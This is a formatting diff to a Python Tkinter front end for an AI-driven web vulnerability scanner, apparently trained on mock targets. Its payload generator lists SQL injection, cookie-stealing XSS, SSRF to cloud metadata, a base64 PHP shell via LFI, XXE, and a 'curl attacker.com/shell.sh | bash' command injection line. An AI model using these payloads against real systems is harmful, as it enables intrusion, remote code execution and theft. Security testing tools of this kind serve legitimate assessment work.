         btn_frame.pack(pady=10, padx=15, fill=tk.X)
-        
-        self.copy_btn = tk.Button(btn_frame, text="📋 COPY PAYLOAD", bg=self.colors["highlight"], fg="white", relief=tk.FLAT, command=self.copy_exploit)
+
+        self.copy_btn = tk.Button(
+            btn_frame,
+            text="📋 COPY PAYLOAD",
+            bg=self.colors["highlight"],
+            fg="white",
+            relief=tk.FLAT,
+            command=self.copy_exploit,
+        )
         self.copy_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
-        
-        self.view_report_btn = tk.Button(btn_frame, text="📄 OPEN REPORT", bg=self.colors["highlight"], fg="white", relief=tk.FLAT, command=self.view_report, state=tk.DISABLED)
+
+        self.view_report_btn = tk.Button(
+            btn_frame,
+            text="📄 OPEN REPORT",
+            bg=self.colors["highlight"],
+            fg="white",
+            relief=tk.FLAT,
+            command=self.view_report,
+            state=tk.DISABLED,
+        )
         self.view_report_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(5, 0))
 
     # toggle_attack_selector removed - no longer needed
 
     def add_section_header(self, parent, text):
-        tk.Label(parent, text=text, font=("Segoe UI", 11, "bold"), bg=self.colors["bg_panel"], fg=self.colors["accent"]).pack(pady=(20, 10), padx=15, anchor=tk.W)
+        tk.Label(
+            parent,
+            text=text,
+            font=("Segoe UI", 11, "bold"),
+            bg=self.colors["bg_panel"],
+            fg=self.colors["accent"],
+        ).pack(pady=(20, 10), padx=15, anchor=tk.W)
 
     def create_input_field(self, parent, label_text, variable, placeholder):
         frame = tk.Frame(parent, bg=self.colors["bg_panel"])
         frame.pack(pady=8, padx=15, fill=tk.X)
-        tk.Label(frame, text=label_text, font=("Segoe UI", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text_dim"]).pack(anchor=tk.W)
-        entry = tk.Entry(frame, textvariable=variable, font=("Segoe UI", 10), bg="#000000", fg="white", relief=tk.FLAT, insertbackground="white", borderwidth=1)
+        tk.Label(
+            frame,
+            text=label_text,
+            font=("Segoe UI", 9, "bold"),
+            bg=self.colors["bg_panel"],
+            fg=self.colors["text_dim"],
+        ).pack(anchor=tk.W)
+        entry = tk.Entry(
+            frame,
+            textvariable=variable,
+            font=("Segoe UI", 10),
+            bg="#000000",
+            fg="white",
+            relief=tk.FLAT,
+            insertbackground="white",
+            borderwidth=1,
+        )
         entry.pack(fill=tk.X, ipady=8, pady=(5, 0))
         entry.insert(0, placeholder)
         ToolTip(entry, f"Enter the {label_text.lower().replace(':', '')} here")
 
-    def create_slider_field(self, parent, label_text, variable, from_, to, default, tooltip_text=None):
+    def create_slider_field(
+        self, parent, label_text, variable, from_, to, default, tooltip_text=None
+    ):
         frame = tk.Frame(parent, bg=self.colors["bg_panel"])
         frame.pack(pady=8, padx=15, fill=tk.X)
-        tk.Label(frame, text=label_text, font=("Segoe UI", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text_dim"]).pack(anchor=tk.W)
-        tk.Scale(frame, from_=from_, to=to, orient=tk.HORIZONTAL, variable=variable, bg=self.colors["bg_panel"], fg=self.colors["accent"], troughcolor="#000000", showvalue=True, highlightthickness=0, font=("Segoe UI", 8)).pack(fill=tk.X)
+        tk.Label(
+            frame,
+            text=label_text,
+            font=("Segoe UI", 9, "bold"),
+            bg=self.colors["bg_panel"],
+            fg=self.colors["text_dim"],
+        ).pack(anchor=tk.W)
+        tk.Scale(
+            frame,
+            from_=from_,
+            to=to,
+            orient=tk.HORIZONTAL,
+            variable=variable,
+            bg=self.colors["bg_panel"],
+            fg=self.colors["accent"],
+            troughcolor="#000000",
+            showvalue=True,
+            highlightthickness=0,
+            font=("Segoe UI", 8),
+        ).pack(fill=tk.X)
         variable.set(default)
         if tooltip_text:
             ToolTip(frame, tooltip_text)
@@ -632,19 +859,40 @@ class SecurityScannerGUI:
     def create_model_selector(self, parent):
         frame = tk.Frame(parent, bg=self.colors["bg_panel"])
         frame.pack(pady=5, padx=15, fill=tk.X)
-        tk.Label(frame, text="BRAIN MODEL:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
-        
+        tk.Label(
+            frame,
+            text="BRAIN MODEL:",
+            font=("Courier New", 9, "bold"),
+            bg=self.colors["bg_panel"],
+            fg=self.colors["text"],
+        ).pack(anchor=tk.W)
+
         combo_frame = tk.Frame(frame, bg=self.colors["bg_panel"])
         combo_frame.pack(fill=tk.X)
-        
-        self.model_combo = ttk.Combobox(combo_frame, textvariable=self.model_path, state="readonly")
+
+        self.model_combo = ttk.Combobox(
+            combo_frame, textvariable=self.model_path, state="readonly"
+        )
         self.model_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
-        
-        browse_btn = tk.Button(combo_frame, text="📂", font=("Consolas", 8), command=self.browse_model, bg=self.colors["highlight"], fg="white", relief=tk.FLAT, width=3)
+
+        browse_btn = tk.Button(
+            combo_frame,
+            text="📂",
+            font=("Consolas", 8),
+            command=self.browse_model,
+            bg=self.colors["highlight"],
+            fg="white",
+            relief=tk.FLAT,
+            width=3,
+        )
         browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
 
     def browse_model(self):
-        filename = filedialog.askopenfilename(initialdir="checkpoints", title="Select Model File", filetypes=(("PyTorch Models", "*.pth"), ("All Files", "*.*")))
+        filename = filedialog.askopenfilename(
+            initialdir="checkpoints",
+            title="Select Model File",
+            filetypes=(("PyTorch Models", "*.pth"), ("All Files", "*.*")),
+        )
         if filename:
             self.model_path.set(filename)
 
@@ -655,22 +903,22 @@ class SecurityScannerGUI:
         for m in main_models:
             if os.path.exists(m):
                 models.append(m)
-        
+
         # Checkpoints
         checkpoints = (
-            glob.glob("checkpoints/improved_mock_ep*.pth") + 
-            glob.glob("checkpoints/dqn_checkpoint_ep*.pth") + 
-            glob.glob("checkpoints/multi_target_*.pth")
+            glob.glob("checkpoints/improved_mock_ep*.pth")
+            + glob.glob("checkpoints/dqn_checkpoint_ep*.pth")
+            + glob.glob("checkpoints/multi_target_*.pth")
         )
-        
+
         # Add discovered checkpoints
         for cp in sorted(checkpoints, reverse=True):
             normalized_path = cp.replace("\\", "/")
             if normalized_path not in models:
                 models.append(normalized_path)
-        
+
         if models:
-            self.model_combo['values'] = models
+            self.model_combo["values"] = models
             # Set to the current selected model if valid
             current = self.model_path.get().replace("\\", "/")
             if current in models:
@@ -679,49 +927,78 @@ class SecurityScannerGUI:
                 self.model_combo.current(0)
                 self.model_path.set(models[0])
         else:
-            self.model_combo['values'] = ["No models found"]
+            self.model_combo["values"] = ["No models found"]
             self.model_combo.current(0)
 
     def log(self, message, level="INFO"):
         timestamp = datetime.now().strftime("%H:%M:%S")
-        prefix = "[+]" if level == "SUCCESS" else "[-]" if level == "ERROR" else "[!]" if level == "WARNING" else "[*]"
-        color = self.colors["accent"] if level == "SUCCESS" else self.colors["danger"] if level == "ERROR" else self.colors["warning"] if level == "WARNING" else self.colors["text_dim"]
-        
+        prefix = (
+            "[+]"
+            if level == "SUCCESS"
+            else "[-]" if level == "ERROR" else "[!]" if level == "WARNING" else "[*]"
+        )
+        color = (
+            self.colors["accent"]
+            if level == "SUCCESS"
+            else (
+                self.colors["danger"]
+                if level == "ERROR"
+                else (
+                    self.colors["warning"]
+                    if level == "WARNING"
+                    else self.colors["text_dim"]
+                )
+            )
+        )
+
         self.output_text.tag_config(level, foreground=color)
         self.output_text.insert(tk.END, f"{prefix} {timestamp} {message}\n", level)
         self.output_text.see(tk.END)
 
     def add_finding(self, finding):
         self.findings.append(finding)
-        vuln_type = finding.get('type', 'Vuln')
+        vuln_type = finding.get("type", "Vuln")
         display_text = f"[{vuln_type}] {finding.get('url', 'URL')}"
-        
+
         self.findings_list.insert(tk.END, display_text)
-        
+
         # Color coding based on severity
         index = self.findings_list.size() - 1
-        
-        high_severity = ['SQL', 'Command', 'RCE', 'Upload', 'XXE', 'SSRF', 'Auth', 'Admin', 'Mass Assignment']
+
+        high_severity = [
+            "SQL",
+            "Command",
+            "RCE",
+            "Upload",
+            "XXE",
+            "SSRF",
+            "Auth",
+            "Admin",
+            "Mass Assignment",
+        ]
         if any(s.lower() in vuln_type.lower() for s in high_severity):
-            self.findings_list.itemconfig(index, {'fg': self.colors["danger"]}) # RED
+            self.findings_list.itemconfig(index, {"fg": self.colors["danger"]})  # RED
         else:
-            self.findings_list.itemconfig(index, {'fg': self.colors["warning"]}) # YELLOW
-            
+            self.findings_list.itemconfig(
+                index, {"fg": self.colors["warning"]}
+            )  # YELLOW
+
         self.findings_list.see(tk.END)
 
     def on_finding_select(self, event):
         selection = self.findings_list.curselection()
-        if not selection: return
+        if not selection:
+            return
         index = selection[0]
         finding = self.findings[index]
-        
+
         # Extract base URL and generate full payload URLs
-        vuln_url = finding.get('url', 'http://target.com')
-        vuln_type = finding.get('type', '')
-        
+        vuln_url = finding.get("url", "http://target.com")
+        vuln_type = finding.get("type", "")
+
         # Generate full URL examples with payloads
         full_url_examples = self._generate_full_url_payloads(vuln_url, vuln_type)
-        
+
         content = f"""# 🚨 VULNERABILITY DETECTED
 Type: {finding.get('type')}
 URL:  {finding.get('url')}
@@ -741,25 +1018,29 @@ Payload: {finding.get('payload')}
 """
         self.exploit_text.delete(1.0, tk.END)
         self.exploit_text.insert(tk.END, content)
-    
+
     def _generate_full_url_payloads(self, base_url, vuln_type):
         """Generate dynamic, context-aware URLs with payloads injected"""
         from urllib.parse import urlparse, parse_qs, urlencode
         import random
-        
+
         parsed = urlparse(base_url)
         base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-        
+
         # Extract existing parameters from URL
         existing_params = parse_qs(parsed.query)
-        param_names = list(existing_params.keys()) if existing_params else ['id', 'q', 'search', 'param']
-        
+        param_names = (
+            list(existing_params.keys())
+            if existing_params
+            else ["id", "q", "search", "param"]
+        )
+
         # Use first param or generate common ones
-        main_param = param_names[0] if param_names else 'id'
-        
+        main_param = param_names[0] if param_names else "id"
+
         examples = []
-        
-        if 'SQL' in vuln_type:
+
+        if "SQL" in vuln_type:
             # Dynamic SQL injection payloads based on context
             sql_payloads = [
                 f"1' OR 1=1--",
@@ -771,38 +1052,47 @@ Payload: {finding.get('payload')}
                 f"1' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
                 f"1'; DROP TABLE users--",
                 f"1' OR 'x'='x",
-                f"1' UNION SELECT @@version,NULL--"
+                f"1' UNION SELECT @@version,NULL--",
             ]
-            
+
             # Generate varied examples with different parameters
-            for i, payload in enumerate(random.sample(sql_payloads, min(5, len(sql_payloads)))):
-                param = random.choice(['id', 'user', 'search', 'q', 'username', main_param])
+            for i, payload in enumerate(
+                random.sample(sql_payloads, min(5, len(sql_payloads)))
+            ):
+                param = random.choice(
+                    ["id", "user", "search", "q", "username", main_param]
+                )
                 examples.append(f"{base_path}?{param}={payload}")
-                
-        elif 'XSS' in vuln_type:
+
+        elif "XSS" in vuln_type:
             # Dynamic XSS payloads with encoding variations
             xss_payloads = [
                 "<script>alert(1)</script>",
                 "<img src=x onerror=alert(document.cookie)>",
                 "<svg/onload=alert(1)>",
-                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                 "javascript:alert(1)",
                 "<iframe src=javascript:alert('XSS')>",
                 "<body onload=alert(1)>",
                 "<input onfocus=alert(1) autofocus>",
                 "<select onfocus=alert(1) autofocus>",
-                "<textarea onfocus=alert(1) autofocus>"
+                "<textarea onfocus=alert(1) autofocus>",
             ]
-            
-            for i, payload in enumerate(random.sample(xss_payloads, min(5, len(xss_payloads)))):
-                param = random.choice(['q', 'search', 'comment', 'name', 'input', main_param])
+
+            for i, payload in enumerate(
+                random.sample(xss_payloads, min(5, len(xss_payloads)))
+            ):
+                param = random.choice(
+                    ["q", "search", "comment", "name", "input", main_param]
+                )
                 # URL encode some payloads
                 if i % 2 == 0:
                     from urllib.parse import quote
+
                     payload = quote(payload)
                 examples.append(f"{base_path}?{param}={payload}")
-                
-        elif 'SSRF' in vuln_type:
+
+        elif "SSRF" in vuln_type:
             # Dynamic SSRF targets
             ssrf_targets = [
                 "http://169.254.169.254/latest/meta-data/",
@@ -814,14 +1104,16 @@ Payload: {finding.get('payload')}
                 "http://metadata.google.internal/computeMetadata/v1/",
                 "http://169.254.169.254/latest/user-data",
                 "gopher://127.0.0.1:6379/_INFO",
-                "dict://127.0.0.1:11211/stat"
+                "dict://127.0.0.1:11211/stat",
             ]
-            
+
             for target in random.sample(ssrf_targets, min(5, len(ssrf_targets))):
-                param = random.choice(['url', 'redirect', 'fetch', 'proxy', 'link', main_param])
+                param = random.choice(
+                    ["url", "redirect", "fetch", "proxy", "link", main_param]
+                )
                 examples.append(f"{base_path}?{param}={target}")
-                
-        elif 'LFI' in vuln_type or 'Path' in vuln_type:
+
+        elif "LFI" in vuln_type or "Path" in vuln_type:
             # Dynamic LFI payloads with different traversal depths
             lfi_payloads = [
                 "../../../../etc/passwd",
@@ -833,14 +1125,16 @@ Payload: {finding.get('payload')}
                 "php://input",
                 "expect://whoami",
                 "zip://shell.zip#shell.php",
-                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
             ]
-            
+
             for payload in random.sample(lfi_payloads, min(5, len(lfi_payloads))):
-                param = random.choice(['file', 'page', 'include', 'path', 'doc', main_param])
+                param = random.choice(
+                    ["file", "page", "include", "path", "doc", main_param]
+                )
                 examples.append(f"{base_path}?{param}={payload}")
-                
-        elif 'Command' in vuln_type:
+
+        elif "Command" in vuln_type:
             # Dynamic command injection with different separators
             cmd_payloads = [
                 "; whoami",
@@ -852,25 +1146,27 @@ Payload: {finding.get('payload')}
                 "`whoami`",
                 "|| uname -a",
                 "; curl http://attacker.com/shell.sh | bash",
-                "& powershell -c Get-Process"
+                "& powershell -c Get-Process",
             ]
-            
+
             for payload in random.sample(cmd_payloads, min(5, len(cmd_payloads))):
-                param = random.choice(['cmd', 'exec', 'run', 'shell', 'ping', main_param])
+                param = random.choice(
+                    ["cmd", "exec", "run", "shell", "ping", main_param]
+                )
                 examples.append(f"{base_path}?{param}={payload}")
-                
-        elif 'IDOR' in vuln_type:
+
+        elif "IDOR" in vuln_type:
             # Dynamic IDOR examples with different ID formats
             idor_examples = [
                 f"{base_path}?id=1 → Try: id=2, id=999, id=admin",
                 f"{base_path}?user_id=123 → Try: user_id=1, user_id=100",
                 f"{base_path}?document=abc123 → Try: document=xyz789",
                 f"{base_path.replace('/user/', '/admin/')} (privilege escalation)",
-                f"{base_path}?uuid=550e8400-e29b-41d4-a716-446655440000 → Try different UUIDs"
+                f"{base_path}?uuid=550e8400-e29b-41d4-a716-446655440000 → Try different UUIDs",
             ]
             examples = idor_examples[:5]
-            
-        elif 'SSTI' in vuln_type:
+
+        elif "SSTI" in vuln_type:
             # Dynamic SSTI payloads for different template engines
             ssti_payloads = [
                 "{{7*7}}",  # Jinja2
@@ -882,35 +1178,37 @@ Payload: {finding.get('payload')}
                 "{{''.class.mro()[1].subclasses()}}",  # Jinja2
                 "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                 "${{<%[%'\"}}%\\",  # Polyglot
-                "{{config.items()}}"
+                "{{config.items()}}",
             ]
-            
+
             for payload in random.sample(ssti_payloads, min(5, len(ssti_payloads))):
-                param = random.choice(['template', 'name', 'input', 'data', 'msg', main_param])
+                param = random.choice(
+                    ["template", "name", "input", "data", "msg", main_param]
+                )
                 examples.append(f"{base_path}?{param}={payload}")
-                
-        elif 'OAuth' in vuln_type or 'CSRF' in vuln_type:
+
+        elif "OAuth" in vuln_type or "CSRF" in vuln_type:
             # OAuth-specific payloads
             oauth_payloads = [
                 f"{base_path}?redirect_uri=https://attacker.com/callback",
                 f"{base_path}?redirect_uri={parsed.scheme}://{parsed.netloc}@attacker.com",
                 f"{base_path}?client_id=test&response_type=code (missing state parameter)",
                 f"{base_path}?redirect_uri=javascript:alert(1)",
-                f"{base_path}/callback?code=STOLEN_CODE"
+                f"{base_path}/callback?code=STOLEN_CODE",
             ]
             examples = oauth_payloads
-            
-        elif 'XXE' in vuln_type:
+
+        elif "XXE" in vuln_type:
             # XXE payloads (for POST requests)
             xxe_payloads = [
-                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
-                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
+                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
+                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
                 f"{base_path} (Send XML with external entity)",
-                f"{base_path} (Content-Type: application/xml)"
+                f"{base_path} (Content-Type: application/xml)",
             ]
             examples = xxe_payloads
-            
+
         else:
             # Generic dynamic payloads
             generic_payloads = [
@@ -918,13 +1216,13 @@ Payload: {finding.get('payload')}
                 f"{base_path}?{main_param}=<script>alert(1)</script>",
                 f"{base_path}?{main_param}=../../../../etc/passwd",
                 f"{base_path}?{main_param}=; whoami",
-                f"{base_path}?{main_param}={{{{7*7}}}}"
+                f"{base_path}?{main_param}={{{{7*7}}}}",
             ]
             examples = generic_payloads
-        
+
         # Add context-aware note
         context_note = f"\n💡 TIP: Payloads are dynamically generated based on:\n   - URL structure: {base_path}\n   - Detected parameters: {', '.join(param_names) if param_names else 'None (using defaults)'}\n   - Vulnerability type: {vuln_type}\n"
-        
+
         return context_note + "\n".join([f"- {url}" for url in examples])
 
     def copy_exploit(self):
@@ -941,30 +1239,30 @@ Payload: {finding.get('payload')}
 
     def start_scan(self, ai_mode=False, pentester=False):
         target = self.target_url.get().strip()
-        
+
         # Validation
         if not target:
             messagebox.showerror("Error", "Please enter a target URL.")
             return
         # Only add http:// if user didn't specify any protocol
-        if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target
+        if not target.startswith(("http://", "https://")):
+            target = "http://" + target
             self.log(f"No protocol specified, defaulting to HTTP: {target}", "INFO")
         else:
             # User specified protocol - respect their choice
-            if target.startswith('https://'):
+            if target.startswith("https://"):
                 self.log(f"Using HTTPS as specified: {target}", "INFO")
             else:
                 self.log(f"Using HTTP as specified: {target}", "INFO")
-        
+
         model_selection = self.model_path.get()
         if " (Final)" in model_selection:
             model = model_selection.replace(" (Final)", "")
         else:
             model = model_selection
-        
+
         self.scan_button.config(state=tk.DISABLED)
-        self.scan_ai_button.config(state=tk.DISABLED) # Disable AI button too
+        self.scan_ai_button.config(state=tk.DISABLED)  # Disable AI button too
         self.flash_btn.config(state=tk.DISABLED)
         self.stop_button.config(state=tk.NORMAL)
         self.is_scanning = True
@@ -973,85 +1271,106 @@ Payload: {finding.get('payload')}
         self.findings_list.delete(0, tk.END)
         self.findings = []
         self.exploit_text.delete(1.0, tk.END)
-        self.exploit_text.insert(tk.END, f"// Scanning target... Mode: {'FULL AI (Unfiltered)' if ai_mode else 'Classic'}... Awaiting findings...")
-        
-        threading.Thread(target=self.run_scan, args=(target, model, ai_mode), daemon=True).start()
+        self.exploit_text.insert(
+            tk.END,
+            f"// Scanning target... Mode: {'FULL AI (Unfiltered)' if ai_mode else 'Classic'}... Awaiting findings...",
+        )
+
+        threading.Thread(
+            target=self.run_scan, args=(target, model, ai_mode), daemon=True
+        ).start()
 
     def run_scan(self, target, model, ai_mode=False):
         # Redirect stdout to GUI
         class StdoutRedirector:
             def __init__(self, text_widget):
                 self.text_widget = text_widget
+
             def write(self, string):
-                self.text_widget.after(0, lambda: self.text_widget.insert(tk.END, string))
+                self.text_widget.after(
+                    0, lambda: self.text_widget.insert(tk.END, string)
+                )
                 self.text_widget.after(0, lambda: self.text_widget.see(tk.END))
+
             def flush(self):
                 pass
-                
+
         old_stdout = sys.stdout
         sys.stdout = StdoutRedirector(self.output_text)
-        
+
         try:
             targets = [target]  # Model only scans single specified target
 
             self.log(f"INITIATING ATTACK SEQUENCE ON {len(targets)} TARGET(S)", "INFO")
             self.log(f"MODEL: {os.path.basename(model)}", "INFO")
-            
+
             # Proxy/Stealth removed - not used in mock target training
             self.log("ℹ️ Scanning local mock targets (no proxy needed)", "INFO")
-            
+
             total_findings = 0
-            
+
             for i, current_target in enumerate(targets):
-                if not self.is_scanning: break
-                
-                self.log(f"\n🚀 SCANNING TARGET {i+1}/{len(targets)}: {current_target}", "INFO")
-                
-                self.auditor = SecurityAuditor(
-                    current_target, 
-                    model
+                if not self.is_scanning:
+                    break
+
+                self.log(
+                    f"\n🚀 SCANNING TARGET {i+1}/{len(targets)}: {current_target}",
+                    "INFO",
                 )
-                
+
+                self.auditor = SecurityAuditor(current_target, model)
+
                 # Create a callback for rendering
                 def render_callback(html_content):
-                     self.root.after(0, lambda: self.update_live_view(html_content))
+                    self.root.after(0, lambda: self.update_live_view(html_content))
 
                 # Hook the log_finding callback
                 original_log_finding = self.auditor.log_finding
+
                 def gui_log_finding(finding):
                     original_log_finding(finding)
                     self.root.after(0, lambda f=finding: self.add_finding(f))
                     # Log detailed vulnerability information
-                    vuln_type = finding.get('type', 'Unknown')
-                    vuln_url = finding.get('url', 'N/A')
-                    vuln_payload = finding.get('payload', 'N/A')
-                    self.root.after(0, lambda: self.log(f"🚨 VULNERABILITY CONFIRMED: {vuln_type}", "WARNING"))
-                    self.root.after(0, lambda: self.log(f"   └─ URL: {vuln_url}", "INFO"))
-                    self.root.after(0, lambda: self.log(f"   └─ Payload: {vuln_payload}", "INFO"))
-                
+                    vuln_type = finding.get("type", "Unknown")
+                    vuln_url = finding.get("url", "N/A")
+                    vuln_payload = finding.get("payload", "N/A")
+                    self.root.after(
+                        0,
+                        lambda: self.log(
+                            f"🚨 VULNERABILITY CONFIRMED: {vuln_type}", "WARNING"
+                        ),
+                    )
+                    self.root.after(
+                        0, lambda: self.log(f"   └─ URL: {vuln_url}", "INFO")
+                    )
+                    self.root.after(
+                        0, lambda: self.log(f"   └─ Payload: {vuln_payload}", "INFO")
+                    )
+
                 self.auditor.log_finding = gui_log_finding
-                
+
                 findings = self.auditor.start_audit(
-                    crawl_depth=self.crawl_depth.get(), 
+                    crawl_depth=self.crawl_depth.get(),
                     test_intensity=self.test_episodes.get(),
                     persist=self.persist_mode.get(),
                     ai_mode=ai_mode,
-                    pentester=pentester, # Pass explicit value or checkbox?
-                    render_callback=render_callback  # Pass the callback
+                    pentester=pentester,  # Pass explicit value or checkbox?
+                    render_callback=render_callback,  # Pass the callback
                 )
                 total_findings += len(findings)
-                
+
                 # Check if user aborted during scan
                 if not self.is_scanning:
                     self.log("⚠️ SCAN ABORTED BY USER", "WARNING")
                     break
-            
+
             # Only show completion if not aborted
             if self.is_scanning:
                 self.root.after(0, lambda: self.scan_complete(total_findings))
-            
+
         except Exception as e:
             import traceback
+
             error_trace = traceback.format_exc()
             print(f"❌ CRITICAL UI SCAN ERROR: {e}\n{error_trace}")
             self.root.after(0, lambda: self.log(f"SYSTEM ERROR: {str(e)}", "ERROR"))
@@ -1068,19 +1387,21 @@ Payload: {finding.get('payload')}
         self.stop_button.config(state=tk.DISABLED)
         self.view_report_btn.config(state=tk.NORMAL)
         self.is_scanning = False
-        messagebox.showinfo("MISSION COMPLETE", f"Scan finished.\nFound {count} vulnerabilities.")
+        messagebox.showinfo(
+            "MISSION COMPLETE", f"Scan finished.\nFound {count} vulnerabilities."
+        )
 
     def stop_scan(self):
         self.log("🛑 ABORTING MISSION...", "WARNING")
         self.is_scanning = False
-        
+
         # Stop the auditor if it exists
         if self.auditor:
             try:
                 self.auditor.stop()
             except Exception as e:
                 self.log(f"Error stopping auditor: {e}", "ERROR")
-        
+
         # Reset UI state
         self.progress.stop()
         self.scan_button.config(state=tk.NORMAL)
@@ -1099,6 +1420,7 @@ Payload: {finding.get('payload')}
                 webbrowser.open(os.path.abspath(latest))
         else:
             messagebox.showinfo("No Reports", "No vulnerability reports found.")
+
 
 if __name__ == "__main__":
     root = tk.Tk()
